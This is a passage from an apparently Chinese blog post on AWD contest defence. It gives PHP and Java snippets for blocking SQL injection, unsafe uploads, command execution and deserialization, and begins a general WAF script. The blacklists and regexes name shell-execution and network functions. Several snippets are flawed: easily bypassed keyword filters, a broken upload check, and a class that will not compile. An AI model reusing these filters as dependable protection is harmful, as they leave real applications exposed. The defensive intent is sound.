        <span class="token class-name">Enumeration</span> params <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameterNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token comment">// 得到参数名</span>
            <span class="token class-name">String</span> name <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 得到参数对应值</span>
            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> value<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                sql <span class="token operator">=</span> sql <span class="token operator">+</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sqlValidate</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"您发送请求中的参数中含有非法字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/**
     * 参数校验
     * @param str
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">sqlValidate</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//统一转为小写</span>
        <span class="token class-name">String</span> badStr <span class="token operator">=</span>
                "select<span class="token operator">|</span>update<span class="token operator">|</span>and<span class="token operator">|</span>or<span class="token operator">|</span>delete<span class="token operator">|</span>insert<span class="token operator">|</span>truncate<span class="token operator">|</span><span class="token keyword">char</span><span class="token operator">|</span>into<span class="token operator">|</span>substr<span class="token operator">|</span>ascii<span class="token operator">|</span>declare<span class="token operator">|</span>exec<span class="token operator">|</span>
        count<span class="token operator">|</span>master<span class="token operator">|</span>into<span class="token operator">|</span>drop<span class="token operator">|</span>execute<span class="token operator">|</span>table"<span class="token punctuation">;</span>
        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> badStrs <span class="token operator">=</span> badStr<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"\\|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> badStrs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token comment">//循环检测，判断在请求参数当中是否包含SQL关键字</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>badStrs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>预编译：</p>
<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$username&#x3D;$_POST[&#39;username&#39;];
$password&#x3D;$_POST[&#39;password&#39;];
$stmt&#x3D;$conn-&gt;prepare(&quot;SELECT * FROM users WHERE username&#x3D;:username AND password&#x3D;:password&quot;);
$stmt-&gt;bindParam(&#39;:username&#39;,$username);
$stmt-&gt;bindParam(&#39;:password&#39;,$password);
$stmt-&gt;execute();
$result&#x3D;$stmt-&gt;fetch(PDO::FETCH_ASSOC);
if($result)
&#123;
    echo &quot;登录成功&quot;;
&#125;
else
&#123;
    echo &quot;用户名或密码错误&quot;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from users where username=? and password=?"</span><span class="token punctuation">;</span>
<span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>
preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//Mybatis</span>
<span class="token annotation punctuation">@Select</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"SELECT * FROM users WHERE username=#&#123;name&#125;"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">User</span> <span class="token function">getUserByName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ol>
<li><p>白名单过滤</p>
<p>PHP：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/png|jpg|jpeg|gif/is"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token comment">#success</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Java：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> fileSuffix <span class="token operator">=</span> fileName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>fileName<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> white_suffix <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token punctuation">,</span><span class="token string">"jpeg"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">Boolean</span> fsFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> suffix<span class="token operator">:</span>white_suffix<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>contentType<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>fileSuffix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        fsFlag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fsFlag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>强制添加后缀名</p>
<p>PHP：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pic"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Java：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> filename <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getOriginalFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".png"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<hr>
<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>PHP：使用<code>escapeshellarg()</code>转义shell元字符</p>
<hr>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/\b(?:call_user_func|call_user_func_array|array_map|array_filter|ob_start|phpinfo|eval|assert|passthru|pcntl_exec|exec|system|escapeshellcmd|popen|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|ob_start|echo|file_put_contents)\b/i"</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token class-name">strpos</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"`"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag&#123;You shall die!&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token class-name">strpos</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"`"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag&#123;You shall die!&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240413174412113.png" alt="image-20240413174412113"></p>
<hr>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>PHP：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 限制phar反序列化</span>
<span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phar|zip|compress.bzip2|compress.zlib"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$filter</span><span class="token operator">.</span><span class="token string double-quoted-string">"/is"</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 将所有的对象都转换为 __PHP_Incomplete_Class 对象</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"allowed_classes"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Java：重写resolveClass</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> myObject <span class="token class-name">Input</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">&#123;</span>
<span class="token keyword">public</span> <span class="token function">myObjectInput</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
    
	<span class="token annotation punctuation">@Override</span>
	<span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span><span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"com.xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized"</span><span class="token punctuation">,</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="拉满"><a href="#拉满" class="headerlink" title="拉满"></a>拉满</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'LOG_FILENAME'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getallheaders'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span> <span class="token keyword">as</span> <span class="token variable">$name</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'HTTP_'</span><span class="token punctuation">)</span> <span class="token variable">$headers</span><span class="token punctuation">[</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span> <span class="token function">ucwords</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">return</span> <span class="token variable">$headers</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">;</span>
  <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">;</span>
  <span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">;</span>
  <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>
  <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_NAME"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">//rewirte shell which uploaded by others, you can do more</span>
  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"virink"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Accept'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//fix a bug</span>
  <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string double-quoted-string">"Get"</span> <span class="token operator">=></span> <span class="token variable">$get</span><span class="token punctuation">,</span>
    <span class="token string double-quoted-string">"Post"</span> <span class="token operator">=></span> <span class="token variable">$post</span><span class="token punctuation">,</span>
    <span class="token string double-quoted-string">"Cookie"</span> <span class="token operator">=></span> <span class="token variable">$cookie</span><span class="token punctuation">,</span>
    <span class="token string double-quoted-string">"File"</span> <span class="token operator">=></span> <span class="token variable">$files</span><span class="token punctuation">,</span>
    <span class="token string double-quoted-string">"Header"</span> <span class="token operator">=></span> <span class="token variable">$header</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">//deal with</span>
  <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex"</span><span class="token punctuation">;</span>
  <span class="token variable">$pattern</span><span class="token operator">.=</span> <span class="token string double-quoted-string">"|file_put_contents|fwrite|curl|system|eval|assert"</span><span class="token punctuation">;</span>
  <span class="token variable">$pattern</span><span class="token operator">.=</span> <span class="token string double-quoted-string">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span><span class="token punctuation">;</span>
  <span class="token variable">$pattern</span><span class="token operator">.=</span> <span class="token string double-quoted-string">"|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec"</span><span class="token punctuation">;</span>
  <span class="token variable">$vpattern</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span> <span class="token variable">$pattern</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$bool</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$input</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$vpattern</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token keyword">as</span> <span class="token variable">$kk</span> <span class="token operator">=></span> <span class="token variable">$vv</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$value</span></span>/i"</span><span class="token punctuation">,</span> <span class="token variable">$vv</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token variable">$bool</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
          <span class="token function">logging</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$bool</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$bool</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">logging</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
